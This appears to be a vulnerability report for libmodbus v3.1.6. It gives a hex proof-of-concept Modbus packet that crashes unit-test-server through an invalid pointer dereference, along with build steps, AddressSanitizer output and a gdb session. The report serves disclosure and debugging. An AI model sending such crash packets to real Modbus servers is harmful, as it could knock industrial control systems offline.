## libmodbus version

  v3.1.6

## OS and/or distribution

  Ubuntu22

## Environment

  ...

## Description

  An Invalid Pointer Dereference vulnerability exists in modbus.c in libmodbus v3.1.6, which can be triggered by sending a specific packet to unit-test-server. The vulnerability appears to be caused by the backend_type pointer not being properly initialized.

## Actual behavior if applicable

  =================================================================
==9000==ERROR: AddressSanitizer: SEGV on unknown address 0x605ffffffe96 (pc 0x59037142649c bp 0x7ffeba556150 sp 0x7ffeba555f30 T0)

## Expected behavior or suggestion

  no crash

## Steps to reproduce the behavior (commands or source code)

   Compile the program with ASAN

~~~
  ./autogen.sh
  ./configure --enable-static CC="clang -fsanitize=address  -O1 -g" CXX="clang -fsanitize=address  -O1 -g"
   make -j8
   clang -g -fsanitize=address -O1  unit-test-server.c -o unit-test-server -I ../src/ ../src/.libs/libmodbus.a
~~~

  run unit-test-server
 `./unit-test-server`

  send POC to unit-test-server

  POC:

  ~~~
00000000000CFF1701600002006B0001021234
  ~~~

  Then, you can see:

~~~
AddressSanitizer:DEADLYSIGNAL

==9000==ERROR: AddressSanitizer: SEGV on unknown address 0x605ffffffe96 (pc 0x59037142649c bp 0x7ffeba556150 sp 0x7ffeba555f30 T0)
==9000==The signal is caused by a WRITE memory access.
    #0 0x59037142649c  (/home/zyl/libmodbus/tests/unit-test-server+0xf49c)
    #1 0x59037141d389  (/home/zyl/libmodbus/tests/unit-test-server+0x6389)
    #2 0x797709629d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
    #3 0x797709629e3f  (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)
    #4 0x59037141e4e4  (/home/zyl/libmodbus/tests/unit-test-server+0x74e4)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/zyl/libmodbus/tests/unit-test-server+0xf49c) 
==9000==ABORTING
Aborted (core dumped)
~~~

## libmodbus output with debug mode enabled

  The cause and location of the vulnerability can be further determined by using gdb

1. Install the preeny library:

```
sudo apt-get install libini_config

sudo apt-get install libseccomp-dev -y

git clone https://github.com/zardus/preeny

cd preeny

make
```

2. Compile libmodbus with -g -O0 and start unit-test-server.

```
 ./autogen.sh

 ./configure --enable-static CC="gcc -g -O0" CXX="g++ -g -O0"

  make -j8

  cd tests

  gcc -g -O0 unit-test-server.c -o unit-test-server -I ../src/ ../src/.libs/libmodbus.a
  
  LD_PRELOAD=/home/XXX/preeny/src/desock.so gdb ./unit-test-server
```

**The last line needs to be replaced with the path to desock.so in your own installation of the preeny library**

~~~
run < ./POC
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /unit-test-server < /POC
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7bff640 (LWP 8757)]
[New Thread 0x7ffff73fe640 (LWP 8758)]
[Thread 0x7ffff7bff640 (LWP 8757) exited]
The client connection from 0.0.0.0 is accepted
Waiting for an indication...
<00><00><00><00><00><0C><FF><17><01><60><00><02><00><6B><00><01><02><12><34>

Thread 1 "unit-test-serve" hit Breakpoint 3, modbus_reply (ctx=ctx@entry=0x5555555782a0, req=req@entry=0x555555578320 "", req_length=<optimized out>, mb_mapping=mb_mapping@entry=0x555555578430) at modbus.c:1001
1001	    return (ctx->backend->backend_type == _MODBUS_BACKEND_TYPE_RTU &&
~~~

  gdb tells us the problem is with `ctx->backend->backend_type == _MODBUS_BACKEND_TYPE_RTU in modbus.c`. Looking at the relevant variables in turn, we can see that it seems to be caused by the fact that the backend_type pointer is not properly initialized.

~~~
(gdb) p ctx
$3 = (modbus_t *) 0x5555555782a0
(gdb) p ctx->backend
$4 = (const modbus_backend_t *) 0x1234555555576b80
(gdb) p ctx->backend->backend_type
Cannot access memory at address 0x1234555555576b80
(gdb) p ctx->backend->backend_type 
Cannot access memory at address 0x1234555555576b80
(gdb) p *ctx->backend->backend_type 
Cannot access memory at address 0x1234555555576b80
~~~



